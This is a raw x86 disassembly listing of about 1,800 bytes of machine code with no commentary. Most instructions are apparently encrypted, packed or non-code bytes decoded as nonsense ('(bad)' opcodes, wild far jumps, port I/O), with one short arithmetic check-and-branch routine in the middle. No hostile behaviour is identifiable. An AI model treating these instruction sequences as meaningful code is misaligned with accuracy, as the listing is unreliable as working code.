  41a237:	cmp    ch,BYTE PTR [edi-0x62]
  41a23a:	mov    dl,0x5
  41a23c:	and    eax,0x90162f9f
  41a241:	fbstp  TBYTE PTR [eax-0x8770437]
  41a247:	mov    ecx,0xbd9bdf35
  41a24c:	js     0x41a259
  41a24e:	sub    eax,0x7809b4eb
  41a253:	adc    al,0x73
  41a255:	test   BYTE PTR [edi-0x7a],bl
  41a258:	enter  0x5a08,0x2
  41a25c:	ss jbe 0x41a29a
  41a25f:	(bad)  
  41a260:	sbb    edx,DWORD PTR [edx+eiz*8-0x4c]
  41a264:	cmp    bl,BYTE PTR [eax+0x22ebbb04]
  41a26a:	retf   0xce8e
  41a26d:	stc    
  41a26e:	icebp  
  41a26f:	aad    0x6b
  41a271:	lock popa 
  41a273:	pop    ecx
  41a274:	mov    dl,0x64
  41a276:	xor    eax,0x56ad2fbf
  41a27b:	inc    ebp
  41a27c:	rol    eax,1
  41a27e:	xor    dh,BYTE PTR ds:0x5bb2602
  41a284:	push   eax
  41a285:	js     0x41a223
  41a287:	mov    bh,ah
  41a289:	mov    ebp,0xcfa4ef22
  41a28e:	popa   
  41a28f:	mov    ebx,0x589406bd
  41a294:	push   ebp
  41a295:	xchg   BYTE PTR [eax],cl
  41a297:	and    eax,0x5e659501
  41a29c:	dec    ebx
  41a29d:	mov    esi,0xf9edbe7
  41a2a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2a3:	cs dec eax
  41a2a5:	jecxz  0x41a258
  41a2a7:	stc    
  41a2a8:	mov    WORD PTR ds:0x65a3e950,fs
  41a2ae:	ss dec esp
  41a2b0:	jp     0x41a311
  41a2b2:	jecxz  0x41a311
  41a2b4:	xchg   esp,eax
  41a2b5:	scas   eax,DWORD PTR es:[edi]
  41a2b6:	jge    0x41a25b
  41a2b8:	and    eax,0xeeaeb80c
  41a2bd:	ret    
  41a2be:	add    DWORD PTR [edi],edi
  41a2c0:	jmp    0x41a331
  41a2c2:	mov    DWORD PTR [ecx+esi*2],edi
  41a2c5:	jne    0x41a2bb
  41a2c7:	mov    dl,0x5a
  41a2c9:	(bad)  
  41a2ca:	xchg   esi,eax
  41a2cb:	sbb    BYTE PTR [ecx-0x1d885292],cl
  41a2d1:	dec    edi
  41a2d2:	shl    BYTE PTR [edx-0x1d76d74c],1
  41a2d8:	xchg   ebp,eax
  41a2d9:	inc    esp
  41a2da:	je     0x41a35b
  41a2dc:	xor    eax,0xc2e88b4f
  41a2e1:	and    DWORD PTR [ebx-0x39],ecx
  41a2e4:	or     al,BYTE PTR es:[edi-0x71]
  41a2e8:	repz int 0xaf
  41a2eb:	pushf  
  41a2ec:	sbb    DWORD PTR [ebp+0x35],ebx
  41a2ef:	dec    esi
  41a2f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2f1:	sti    
  41a2f2:	cdq    
  41a2f3:	cs mov bl,0x59
  41a2f6:	es aaa 
  41a2f8:	push   ds
  41a2f9:	dec    esi
  41a2fa:	mov    ebx,0x175380c5
  41a2ff:	push   0xffffffc3
  41a301:	ror    BYTE PTR [esi-0x6c],cl
  41a304:	xchg   DWORD PTR [ebx-0x3b],esp
  41a307:	cwde   
  41a308:	xchg   edi,eax
  41a309:	jns    0x41a331
  41a30b:	inc    esp
  41a30c:	and    BYTE PTR [ebx-0x65e0bd16],ch
  41a312:	and    ch,BYTE PTR [esi+edx*8]
  41a315:	or     bh,BYTE PTR ds:0x72b2dc5a
  41a31b:	loop   0x41a349
  41a31d:	stos   DWORD PTR es:[edi],eax
  41a31e:	adc    cl,BYTE PTR ds:0xd44d21fa
  41a324:	jl     0x41a2ba
  41a326:	ins    BYTE PTR es:[edi],dx
  41a327:	je     0x41a338
  41a329:	imul   ebp,DWORD PTR [eax-0x7c],0xffffffab
  41a32d:	push   0xf2ca8fc1
  41a332:	add    eax,0xbd8fa7fd
  41a337:	pop    es
  41a338:	and    dh,dh
  41a33a:	cli    
  41a33b:	xor    eax,0xb4573ec8
  41a340:	jne    0x41a306
  41a342:	mov    ah,0x11
  41a344:	adc    al,0x7f
  41a346:	xchg   bl,dl
  41a348:	pop    esi
  41a349:	les    edi,FWORD PTR [esi]
  41a34b:	cli    
  41a34c:	dec    edi
  41a34d:	ret    0x2491
  41a350:	sar    BYTE PTR [esi-0x6],1
  41a353:	sub    bh,BYTE PTR [ebx]
  41a355:	push   esp
  41a356:	stc    
  41a357:	inc    edi
  41a358:	enter  0x743c,0x32
  41a35c:	stc    
  41a35d:	es xor ebx,edi
  41a360:	push   eax
  41a361:	sub    bh,BYTE PTR [ebp+eiz*1+0x4a]
  41a365:	sub    eax,0xb7d27230
  41a36a:	pop    ds
  41a36b:	cs add eax,0x2f2764a5
  41a371:	or     ecx,DWORD PTR [edi]
  41a373:	mov    cl,0xdc
  41a375:	sub    al,ch
  41a377:	rcl    BYTE PTR [edi-0x37a55779],cl
  41a37d:	push   esp
  41a37e:	rol    BYTE PTR [edx],0x30
  41a381:	dec    ecx
  41a382:	and    DWORD PTR [ecx*8-0x48139e50],0xffffff8d
  41a38a:	mov    eax,0xaee7480a
  41a38f:	jp     0x41a375
  41a391:	mov    ?,WORD PTR [ecx+0x14ce5c95]
  41a397:	and    ecx,ebp
  41a399:	dec    esp
  41a39a:	jbe    0x41a38e
  41a39c:	push   ds
  41a39d:	sahf   
  41a39e:	daa    
  41a39f:	clc    
  41a3a0:	xor    al,0x6a
  41a3a2:	aad    0x17
  41a3a4:	or     ah,BYTE PTR [ecx+ebp*1+0x77]
  41a3a8:	push   ebx
  41a3a9:	push   ecx
  41a3aa:	fistp  WORD PTR [edi+0xf859ebb]
  41a3b0:	pop    ss
  41a3b1:	ret    0x91c6
  41a3b4:	fsub   DWORD PTR [edi+ebp*8+0x65afeae8]
  41a3bb:	ror    DWORD PTR [esi],cl
  41a3bd:	mov    eax,0x6000e988
  41a3c2:	nop
  41a3c3:	cmp    esi,0x17
  41a3c6:	mov    al,0xb5
  41a3c8:	in     al,0xff
  41a3ca:	mov    esi,DWORD PTR [eax+0x15]
  41a3cd:	leave  
  41a3ce:	div    edx
  41a3d0:	jmp    0x41a387
  41a3d2:	jge    0x41a3cc
  41a3d4:	or     al,0x3f
  41a3d6:	hlt    
  41a3d7:	pop    ds
  41a3d8:	imul   eax,DWORD PTR [edi],0xffffffb6
  41a3db:	les    edx,FWORD PTR [ebx]
  41a3dd:	rcr    DWORD PTR [ecx-0x22],1
  41a3e0:	sbb    BYTE PTR [ecx],0xc
  41a3e3:	(bad)  
  41a3e4:	mov    ebp,0xe9b54e24
  41a3e9:	pop    ebp
  41a3ea:	div    BYTE PTR [esi]
  41a3ec:	fnstsw WORD PTR [edx-0x1a]
  41a3ef:	rol    al,1
  41a3f1:	cwde   
  41a3f2:	mov    al,0x5a
  41a3f4:	inc    edx
  41a3f5:	icebp  
  41a3f6:	call   0x4c3c:0xaa929e0e
  41a3fd:	popf   
  41a3fe:	add    DWORD PTR [edi+eax*8],ebp
  41a401:	hlt    
  41a402:	mov    DWORD PTR [edx],ebp
  41a404:	add    eax,0x7cd33394
  41a409:	out    0xa7,eax
  41a40b:	jp     0x41a3b5
  41a40d:	xchg   esp,eax
  41a40e:	cmp    bh,BYTE PTR [edi]
  41a410:	cwde   
  41a411:	icebp  
  41a412:	ja     0x41a469
  41a414:	fadd   st(6),st
  41a416:	jnp    0x41a48e
  41a418:	dec    esi
  41a419:	lahf   
  41a41a:	lock xor DWORD PTR [ecx+0x52db5f83],eax
  41a421:	(bad)  
  41a422:	cmp    DWORD PTR [ebx],edi
  41a424:	cmp    eax,0x2a7da44a
  41a429:	mov    DWORD PTR [edx-0x19],ebp
  41a42c:	rcl    BYTE PTR [edi+ebp*4],1
  41a42f:	in     al,dx
  41a430:	push   ds
  41a431:	mov    bh,0x31
  41a433:	xchg   ebx,eax
  41a434:	mov    ecx,0xaa62a0c3
  41a439:	or     al,0x71
  41a43b:	or     cl,bh
  41a43d:	into   
  41a43e:	add    al,0x2
  41a440:	rcr    ah,1
  41a442:	stos   BYTE PTR es:[edi],al
  41a443:	mov    ecx,0xb5da4250
  41a448:	(bad)  
  41a449:	mov    esi,0xd486b1b4
  41a44e:	std    
  41a44f:	int3   
  41a450:	add    edi,DWORD PTR [eax]
  41a452:	mov    al,0x7c
  41a454:	mov    ebx,edi
  41a456:	inc    ebp
  41a457:	outs   dx,BYTE PTR ds:[esi]
  41a458:	mov    WORD PTR [ecx+edx*1-0x798d550e],ds
  41a45f:	sub    BYTE PTR [ebp+0x19],ch
  41a462:	pop    ds
  41a463:	out    0xe0,eax
  41a465:	shl    BYTE PTR [eax+0x5a],0x84
  41a469:	jl     0x41a4de
  41a46b:	mov    ds:0xc514cc9c,eax
  41a470:	data16 sbb al,0x54
  41a473:	pop    esp
  41a474:	cmp    eax,0x4a220f30
  41a479:	pop    edi
  41a47a:	xchg   edx,eax
  41a47b:	jns    0x41a46a
  41a47d:	and    DWORD PTR [eax-0x775adfd9],ebp
  41a483:	jmp    0x7070afbe
  41a488:	pop    eax
  41a489:	icebp  
  41a48a:	mov    esi,0x57bbf92b
  41a48f:	pop    ecx
  41a490:	mov    ds:0x58f71a81,al
  41a495:	and    BYTE PTR [ebx+0x12],dh
  41a498:	out    dx,al
  41a499:	aaa    
  41a49a:	(bad)  
  41a49c:	xchg   ebp,eax
  41a49d:	dec    ebp
  41a49e:	ds dec ebp
  41a4a0:	sub    bh,dl
  41a4a2:	fs add al,0x26
  41a4a5:	mov    BYTE PTR [edi],dh
  41a4a7:	cli    
  41a4a8:	or     DWORD PTR [ecx+0x3179e638],0xffffff92
  41a4af:	aam    0x69
  41a4b1:	cmp    dl,bh
  41a4b3:	xor    DWORD PTR [ebx],esi
  41a4b5:	repnz add eax,ecx
  41a4b8:	add    esi,ecx
  41a4ba:	imul   eax,esi
  41a4bd:	jmp    0x41c8af
  41a4c2:	mov    eax,DWORD PTR [ebp+0xc]
  41a4c5:	mov    eax,DWORD PTR [eax+0x78]
  41a4c8:	mov    DWORD PTR [ebp+0xc],eax
  41a4cb:	mov    eax,DWORD PTR [ebp-0x4]
  41a4ce:	mov    esi,DWORD PTR [ebp-0x8]
  41a4d1:	xor    eax,edx
  41a4d3:	xor    esi,edx
  41a4d5:	add    eax,ecx
  41a4d7:	add    esi,ecx
  41a4d9:	imul   eax,esi
  41a4dc:	mov    esi,DWORD PTR [ebp+0xc]
  41a4df:	cmp    esi,eax
  41a4e1:	mov    eax,DWORD PTR [ebp-0x4]
  41a4e4:	je     0x4180fd
  41a4ea:	xor    eax,edx
  41a4ec:	jmp    0x41c89e
  41a4f1:	aaa    
  41a4f2:	dec    eax
  41a4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f4:	sbb    DWORD PTR [edi-0x67],esp
  41a4f7:	xchg   DWORD PTR [eax],ebp
  41a4f9:	and    bl,BYTE PTR [ecx+eiz*8-0x3cfe4155]
  41a500:	push   ebp
  41a501:	dec    eax
  41a502:	add    BYTE PTR [ecx+0x62],ah
  41a505:	int    0x5f
  41a507:	bound  esp,QWORD PTR [edx+0x6e]
  41a50a:	jge    0x41a4c0
  41a50c:	or     ebp,DWORD PTR ds:0xff4dd8bc
  41a512:	jne    0x41a4d0
  41a514:	into   
  41a515:	mov    WORD PTR [ecx-0x5c],gs
  41a518:	adc    eax,DWORD PTR [ebx]
  41a51a:	push   ds
  41a51b:	shr    BYTE PTR [esi+0x74846c9],0xda
  41a522:	mov    ch,BYTE PTR [ecx+0x71]
  41a525:	and    bl,BYTE PTR [eax]
  41a527:	repz das 
  41a529:	mov    dh,0x33
  41a52b:	push   ebp
  41a52c:	les    esi,FWORD PTR [edx+0x1a667966]
  41a532:	loop   0x41a580
  41a534:	mov    edx,0xc5dbf404
  41a539:	iret   
  41a53a:	scas   eax,DWORD PTR es:[edi]
  41a53b:	ss out 0x30,al
  41a53e:	nop
  41a53f:	cwde   
  41a540:	outs   dx,BYTE PTR ds:[esi]
  41a541:	sub    eax,0x75dd5a6f
  41a546:	mov    BYTE PTR [ecx-0x3a47432f],bh
  41a54c:	xor    bh,ah
  41a54e:	push   esi
  41a54f:	test   eax,0x9fda7ce6
  41a554:	mov    bh,0x6f
  41a556:	test   DWORD PTR [ebx+0x5ce7700],ecx
  41a55c:	repnz lock jmp 0x6397:0xd08d581b
  41a565:	and    edi,DWORD PTR [ecx]
  41a567:	shl    DWORD PTR [ecx],0xa9
  41a56a:	mov    bh,0xf7
  41a56c:	jne    0x41a55f
  41a56e:	pavgw  mm2,mm4
  41a571:	pop    ss
  41a572:	add    ebp,esp
  41a574:	pop    ss
  41a575:	js     0x41a515
  41a577:	in     al,0x80
  41a579:	stc    
  41a57a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a57b:	sbb    dl,BYTE PTR [esi-0x5dee512]
  41a581:	into   
  41a582:	push   ss
  41a583:	sub    eax,0x13e0cd96
  41a588:	jl     0x41a532
  41a58a:	outs   dx,BYTE PTR gs:[esi]
  41a58c:	xor    BYTE PTR [eax+0x70],al
  41a58f:	mov    ch,0xae
  41a591:	adc    esi,DWORD PTR [ebp-0xdd84565]
  41a597:	xor    BYTE PTR [ebx+ebx*2],cl
  41a59a:	cld    
  41a59b:	mov    cl,0x2
  41a59d:	mov    esi,DWORD PTR [ecx+0x3d]
  41a5a0:	fnsave [ebx+0x2c]
  41a5a3:	mov    dh,0xbd
  41a5a5:	fwait
  41a5a6:	mov    dl,0x17
  41a5a8:	mov    dl,0x64
  41a5aa:	mov    ecx,edi
  41a5ac:	ins    BYTE PTR es:[edi],dx
  41a5ad:	xor    al,0x64
  41a5af:	ds and al,0x1f
  41a5b2:	xor    esp,DWORD PTR [eax+0x4e43356b]
  41a5b8:	or     bh,BYTE PTR [ecx]
  41a5ba:	or     DWORD PTR [esi],esp
  41a5bc:	adc    eax,0x96e86c2d
  41a5c1:	scas   eax,DWORD PTR es:[edi]
  41a5c2:	icebp  
  41a5c3:	stc    
  41a5c4:	out    dx,eax
  41a5c5:	ror    DWORD PTR [ebp+0x6d60e64b],cl
  41a5cb:	pop    es
  41a5cc:	in     al,dx
  41a5cd:	(bad)  
  41a5cf:	xor    eax,0x7b6935d8
  41a5d4:	push   esp
  41a5d5:	jmp    0xca4e864b
  41a5da:	pop    edi
  41a5db:	push   esi
  41a5dc:	push   ebp
  41a5dd:	mov    al,ds:0xbcb233d6
  41a5e2:	pop    esi
  41a5e3:	adc    eax,0x372b863e
  41a5e8:	pop    ebx
  41a5e9:	add    DWORD PTR [ecx-0x10],0x6d2ef434
  41a5f0:	mov    al,bl
  41a5f2:	xchg   esi,eax
  41a5f3:	or     dh,bl
  41a5f5:	or     bl,BYTE PTR [edx]
  41a5f7:	test   DWORD PTR [eax-0x55953e16],0x8ae2db39
  41a601:	fisttp WORD PTR [edi]
  41a603:	xor    al,BYTE PTR [ebx]
  41a605:	xor    eax,0x852b09b4
  41a60a:	lea    esi,[ecx]
  41a60c:	mov    ebp,0x58268b17
  41a611:	pop    ds
  41a612:	adc    DWORD PTR [edx+eax*4+0x6d],ebx
  41a616:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a617:	mov    ch,0x6c
  41a619:	scas   al,BYTE PTR es:[edi]
  41a61a:	hlt    
  41a61b:	jmp    0x41a601
  41a61d:	nop
  41a61e:	xchg   ebx,esi
  41a620:	ret    
  41a621:	sub    eax,0x838a5cbe
  41a626:	dec    ecx
  41a627:	hlt    
  41a628:	loop   0x41a5ae
  41a62a:	pop    es
  41a62b:	daa    
  41a62c:	outs   dx,BYTE PTR ds:[esi]
  41a62d:	jb     0x41a657
  41a62f:	les    ebx,FWORD PTR [ebx+0x6a]
  41a632:	jbe    0x41a61f
  41a634:	imul   edi,eax,0xffffffd1
  41a637:	inc    eax
  41a638:	out    dx,al
  41a639:	mov    eax,0x300e8c04
  41a63e:	loop   0x41a604
  41a640:	fistp  QWORD PTR [ecx-0x5888b21d]
  41a646:	cdq    
  41a647:	fwait
  41a648:	mov    ?,WORD PTR ds:0x67ed2e8a
  41a64e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a64f:	repnz sar BYTE PTR [ebx],1
  41a652:	in     al,0x72
  41a654:	push   esi
  41a655:	stos   DWORD PTR es:[edi],eax
  41a656:	add    eax,0x4b36cb73
  41a65b:	or     edi,ebx
  41a65d:	loope  0x41a677
  41a65f:	retf   0x1e6a
  41a662:	stos   DWORD PTR es:[edi],eax
  41a663:	and    edi,DWORD PTR [ebx]
  41a665:	pushf  
  41a666:	ja     0x41a68d
  41a668:	dec    eax
  41a669:	dec    ebx
  41a66a:	int3   
  41a66b:	mov    DWORD PTR [eax-0x3a2ddf3c],ebx
  41a671:	jbe    0x41a662
  41a673:	(bad)  
  41a674:	adc    al,0x89
  41a676:	lock xchg dl,cl
  41a679:	ins    DWORD PTR es:[edi],dx
  41a67a:	jl     0x41a6aa
  41a67c:	je     0x41a69d
  41a67e:	call   0xc40:0x5c3da625
  41a685:	jl     0x41a6ee
  41a687:	sbb    BYTE PTR [eax-0x5952dfef],ah
  41a68d:	stos   BYTE PTR es:[edi],al
  41a68e:	adc    DWORD PTR [eax+0x5b],ebp
  41a691:	jbe    0x41a687
  41a693:	or     ebx,DWORD PTR [ecx-0x41755678]
  41a699:	mov    ds:0x4417a2d,eax
  41a69e:	sub    al,0x39
  41a6a0:	inc    ebx
  41a6a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6a2:	mov    eax,0xaf18c620
  41a6a7:	pusha  
  41a6a8:	xchg   edx,eax
  41a6a9:	push   0x7fb5248c
  41a6ae:	ds mov dl,0xc3
  41a6b1:	push   esi
  41a6b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6b3:	or     cl,ch
  41a6b5:	pop    ss
  41a6b6:	outs   dx,DWORD PTR ds:[esi]
  41a6b7:	xor    al,0x27
  41a6b9:	cmp    eax,0x4b37518
  41a6be:	mov    eax,0xed787fc
  41a6c3:	paddq  mm4,QWORD PTR [esi-0x197f10f4]
  41a6ca:	fsub   DWORD PTR ds:0x50bbb467
  41a6d0:	jmp    0x41a681
  41a6d2:	or     eax,DWORD PTR [edx]
  41a6d4:	retf   
  41a6d5:	imul   esi,DWORD PTR [eax+esi*2+0x5cd02f77],0x16
  41a6dd:	lock add DWORD PTR [esp+eiz*8],ebp
  41a6e1:	inc    esp
  41a6e2:	stos   BYTE PTR es:[edi],al
  41a6e3:	sbb    edx,edi
  41a6e5:	nop
  41a6e6:	outs   dx,BYTE PTR ds:[esi]
  41a6e7:	adc    DWORD PTR [ecx+0x75b51a32],0x7f29f83b
  41a6f1:	lods   al,BYTE PTR ds:[esi]
  41a6f2:	adc    DWORD PTR [ecx],edx
  41a6f4:	lahf   
  41a6f5:	call   0x476c559
  41a6fa:	loope  0x41a6d0
  41a6fc:	inc    ecx
  41a6fd:	and    eax,0x5a905ca8
  41a702:	push   edx
  41a703:	inc    ecx
  41a704:	jno    0x41a687
  41a706:	push   edx
  41a707:	inc    edi
  41a708:	cs cdq 
  41a70a:	out    0xd1,al
  41a70c:	sub    ah,dl
  41a70e:	pop    ds
  41a70f:	int3   
  41a710:	sub    eax,0x51654527
  41a715:	inc    ebx
  41a716:	or     DWORD PTR [eax+0x4],ecx
  41a719:	xchg   ebp,eax
  41a71a:	inc    ebp
  41a71b:	sbb    DWORD PTR [eax],esp
  41a71d:	mov    ecx,0xd87533e3
  41a722:	mov    dl,0x16
  41a724:	imul   ebx,DWORD PTR ds:[esp+eax*2],0x89fe3bae
  41a72c:	sbb    al,0x95
  41a72e:	jns    0x41a73f
  41a730:	jae    0x41a6fa
  41a732:	outs   dx,BYTE PTR ds:[esi]
  41a733:	(bad)  [edx-0x6e]
  41a736:	mov    esi,0xcaa4cde1
  41a73b:	fisub  DWORD PTR [ecx-0x499f0745]
  41a741:	arpl   WORD PTR [ecx],bx
  41a743:	sbb    ebp,edx
  41a745:	imul   ebx,ecx,0x1e
  41a748:	sbb    edi,DWORD PTR [edi+0x4dcc4303]
  41a74e:	cmc    
  41a74f:	mov    cl,BYTE PTR [ecx-0x2b9b9921]
  41a755:	pop    eax
  41a756:	in     eax,dx
  41a757:	(bad)  
  41a758:	and    esp,edx
  41a75a:	call   0x1aa7:0xbf175deb
  41a761:	push   ebp
  41a762:	cwde   
  41a763:	jae    0x41a6fd
  41a765:	cmp    al,0x36
  41a767:	mov    bl,0x42
  41a769:	push   edx
  41a76a:	lds    ecx,FWORD PTR [eax+eax*1]
  41a76d:	sahf   
  41a76e:	jl     0x41a77f
  41a770:	pop    es
  41a771:	ret    
  41a772:	dec    ebx
  41a773:	cmp    bh,BYTE PTR [ecx-0x6a1ae68]
  41a779:	dec    esi
  41a77a:	ror    DWORD PTR [eax-0x37],1
  41a77d:	pop    esi
  41a77e:	dec    edx
  41a77f:	gs sti 
  41a781:	or     ebp,ebx
  41a783:	xchg   esi,eax
  41a784:	std    
  41a785:	out    0x3d,al
  41a787:	dec    edi
  41a788:	mov    ebx,ds
  41a78a:	loopne 0x41a807
  41a78c:	mov    es,WORD PTR [ecx+0x75]
  41a78f:	cli    
  41a790:	fwait
  41a791:	pop    ds
  41a792:	push   ecx
  41a793:	sahf   
  41a794:	xchg   edi,eax
  41a795:	(bad)  [ecx+0x67]
  41a798:	fcomip st,st(2)
  41a79a:	pop    ebp
  41a79b:	adc    BYTE PTR [edx+edx*2-0x6fd0c40d],cl
  41a7a2:	lds    edx,FWORD PTR [edi]
  41a7a4:	imul   esp,ecx,0xa550eb0b
  41a7aa:	jl     0x41a7d9
  41a7ac:	xchg   edx,eax
  41a7ad:	mov    ecx,0x8a7a2f0a
  41a7b2:	add    DWORD PTR [edi+0x14],eax
  41a7b5:	in     al,0xa6
  41a7b7:	(bad)  
  41a7b8:	mov    ch,0xaa
  41a7ba:	scas   al,BYTE PTR es:[edi]
  41a7bb:	inc    ebx
  41a7bc:	mov    edi,0xdac373d9
  41a7c1:	mov    ebx,fs
  41a7c3:	rcl    dh,cl
  41a7c5:	jecxz  0x41a783
  41a7c7:	and    DWORD PTR [edi+ecx*4],esp
  41a7ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7cb:	retf   0x8ab9
  41a7ce:	xor    eax,0x4c9d57a1
  41a7d3:	imul   esi,DWORD PTR [esi+ecx*4+0x67ea644],0x3e990160
  41a7de:	frstor [ebx-0xe]
  41a7e1:	xchg   esp,eax
  41a7e2:	jo     0x41a7c8
  41a7e4:	sub    DWORD PTR [eax],esi
  41a7e6:	jle    0x41a82d
  41a7e8:	inc    eax
  41a7e9:	add    eax,0xef12ea4
  41a7ee:	inc    ebp
  41a7ef:	xor    DWORD PTR [ecx],ebx
  41a7f1:	cmp    ebx,DWORD PTR [ebx+0x1c]
  41a7f4:	jnp    0x41a7eb
  41a7f6:	xchg   ebp,eax
  41a7f7:	add    DWORD PTR [ebx],eax
  41a7f9:	ss scas al,BYTE PTR es:[edi]
  41a7fb:	push   ecx
  41a7fc:	sub    bl,ah
  41a7fe:	sub    bh,dh
  41a800:	sahf   
  41a801:	cwde   
  41a802:	rcl    BYTE PTR [ebp+0x1f],0xa1
  41a806:	repz fbstp TBYTE PTR [esi]
  41a809:	ror    DWORD PTR [ecx],0x8a
  41a80c:	pusha  
  41a80d:	xor    al,0x63
  41a80f:	add    edx,0xfffffff0
  41a812:	fs jp  0x41a7d1
  41a815:	addr16 neg bh
  41a818:	pop    edi
  41a819:	call   0xb2bf8751
  41a81e:	sub    DWORD PTR [edi-0x7e],0xffffffbe
  41a822:	(bad)  
  41a823:	aas    
  41a824:	lods   al,BYTE PTR ds:[esi]
  41a825:	cmp    dl,BYTE PTR [ebx+ebx*2]
  41a828:	in     eax,dx
  41a829:	mov    ch,0x25
  41a82b:	push   DWORD PTR [esi+edi*4]
  41a82e:	push   0x10075e0
  41a833:	jmp    0xa6e0019a
  41a838:	cmp    al,0xd7
  41a83a:	dec    ebx
  41a83b:	inc    ecx
  41a83c:	scas   al,BYTE PTR es:[edi]
  41a83d:	sbb    al,0xca
  41a83f:	pop    ss
  41a840:	xor    ah,BYTE PTR [edi-0x3c]
  41a843:	call   0x9f6b:0xc8750632
  41a84a:	add    al,0x51
  41a84c:	or     al,0xf8
  41a84e:	add    eax,0x76526e2c
  41a853:	inc    esp
  41a854:	jns    0x41a879
  41a856:	pop    esp
  41a857:	arpl   WORD PTR [ebx+0x61],si
  41a85a:	inc    eax
  41a85b:	jmp    0x41a7df
  41a85d:	call   0x86c5:0xa9d294b7
  41a864:	iret   
  41a865:	int3   
  41a866:	fs call 0xec68:0x2d398212
  41a86e:	js     0x41a7fb
  41a870:	adc    esi,edi
  41a872:	test   al,0x70
  41a874:	in     al,dx
  41a875:	pop    ss
  41a876:	cli    
  41a877:	data16 scas al,BYTE PTR es:[edi]
  41a879:	add    DWORD PTR [ecx-0x2],0xffffffa1
  41a87d:	mov    esp,0x698f1641
  41a882:	push   cs
  41a883:	sub    ah,BYTE PTR [edx]
  41a885:	test   eax,0xe7b8fffa
  41a88a:	jecxz  0x41a80e
  41a88c:	stos   BYTE PTR es:[edi],al
  41a88d:	and    BYTE PTR [ecx+esi*8-0x7b],cl
  41a891:	or     BYTE PTR [edi-0x78],ah
  41a894:	rcr    DWORD PTR [edx+0x43],0x44
  41a898:	outs   dx,DWORD PTR ds:[esi]
  41a899:	mov    ebp,0x63d5cb90
  41a89e:	push   0x21
  41a8a0:	xor    al,0xca
  41a8a2:	stos   DWORD PTR es:[edi],eax
  41a8a3:	xchg   BYTE PTR [edx+0x200bc4f7],bh
  41a8a9:	ret    
  41a8aa:	mov    edi,0xf61ebc5a
  41a8af:	inc    esi
  41a8b0:	push   es
  41a8b1:	jmp    0x9567440
  41a8b6:	data16 fist WORD PTR [ebx-0x53]
  41a8ba:	das    
  41a8bb:	inc    ebp
  41a8bc:	imul   ebp,DWORD PTR [eax-0x5bb0129d],0xffffff97
  41a8c3:	out    0xf4,al
  41a8c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8c6:	mov    esp,0xe196ade1
  41a8cb:	mov    ebx,0xcc88e29b
  41a8d0:	jmp    0x4e79:0x56fa4337
  41a8d7:	xchg   ch,bl
  41a8d9:	neg    DWORD PTR [ecx-0x17d59a01]
  41a8df:	gs call 0x16426266
  41a8e5:	dec    edi
  41a8e6:	cmp    al,ah
  41a8e8:	dec    ecx
  41a8e9:	rol    BYTE PTR [ecx-0x45],1
  41a8ec:	mov    esi,es
  41a8ee:	jns    0x41a871
  41a8f0:	retf   0x1827
  41a8f3:	xor    BYTE PTR [eax+0x2a205a78],al
  41a8f9:	sub    ebx,DWORD PTR [edx+ebx*4+0x7b]
  41a8fd:	inc    ebp
  41a8fe:	scas   al,BYTE PTR es:[edi]
  41a8ff:	arpl   WORD PTR [ecx],si
  41a901:	ficomp DWORD PTR [edx]
  41a903:	sar    BYTE PTR [esi-0x44122469],cl
  41a909:	and    BYTE PTR ds:0xf097ffa9,0x70
  41a910:	in     eax,dx
  41a911:	add    al,0x74
  41a913:	sbb    DWORD PTR ds:0x44967343,esp
  41a919:	push   eax
  41a91a:	scas   al,BYTE PTR es:[edi]
  41a91b:	and    ch,bh
  41a91d:	pop    edx
  41a91e:	int    0xc5
  41a920:	or     eax,0x241a82ca
  41a925:	mov    edx,0x2094a377
  41a92a:	lds    esp,FWORD PTR [ebx]
  41a92c:	cmp    dl,BYTE PTR [eax+0x6f]
  41a92f:	mov    ah,0xe5
  41a931:	sar    esp,1
  41a933:	cld    
  41a934:	push   ds
  41a935:	leave  
  41a936:	and    DWORD PTR [eax],edi
  41a938:	(bad)  
  41a939:	in     al,dx
  41a93a:	ret    
  41a93b:	iret   
  41a93c:	ret    0xb5f4
  41a93f:	icebp  
  41a940:	xchg   DWORD PTR [edi],esp
  41a942:	popa   
  41a943:	daa    
  41a944:	mov    ebp,esp
  41a946:	inc    ebp
  41a947:	cmc    
  41a948:	mov    bh,0x1
  41a94a:	add    ebx,DWORD PTR [eax]
  41a94c:	inc    esi
  41a94d:	jmp    0x57b9:0x16190c8b
  41a954:	in     al,0xe7
  41a956:	ret    0x2a34
  41a959:	repz push esi
  41a95b:	xchg   ebx,eax
  41a95c:	add    DWORD PTR [edi],ecx
  41a95e:	or     al,0x11
  41a960:	arpl   WORD PTR [esi+0x1c],si
  41a963:	xchg   esi,eax
  41a964:	dec    esi
  41a965:	xchg   ebx,eax
  41a966:	push   esp
  41a967:	in     al,0x6b
  41a969:	and    BYTE PTR [eax],al
  41a96b:	clc    
  41a96c:	sbb    BYTE PTR [ebx+0x2b8ab167],al
  41a972:	xchg   DWORD PTR [esi+ebp*2],edi
  41a975:	push   ecx
  41a976:	push   ebx
  41a977:	clc    
  41a978:	sti    
  41a979:	jp     0x41a988
  41a97b:	xor    DWORD PTR [eax],edi
  41a97d:	mov    eax,0xf29391e0
  41a982:	jnp    0x41a9b4
  41a984:	xchg   esi,eax
  41a985:	mov    bh,0x80
  41a987:	test   BYTE PTR [edx+0x690592],bh
  41a98d:	jne    0x41a9fa
  41a98f:	jl     0x41a984
  41a991:	or     al,0x36
  41a993:	and    eax,0xbbb1cd0a
  41a998:	(bad)  
  41a999:	xor    eax,0xa705dc64
  41a99e:	add    al,0x34
  41a9a0:	das    
  41a9a1:	stos   DWORD PTR es:[edi],eax
  41a9a2:	mov    edi,0x59c16156
  41a9a7:	adc    al,0x3c
  41a9a9:	mov    al,0xad
  41a9ab:	es enter 0xdee2,0x58
  41a9b0:	ss mov bl,0x7c
  41a9b3:	sub    esi,ebp
  41a9b5:	pop    esp
  41a9b6:	xchg   edx,eax
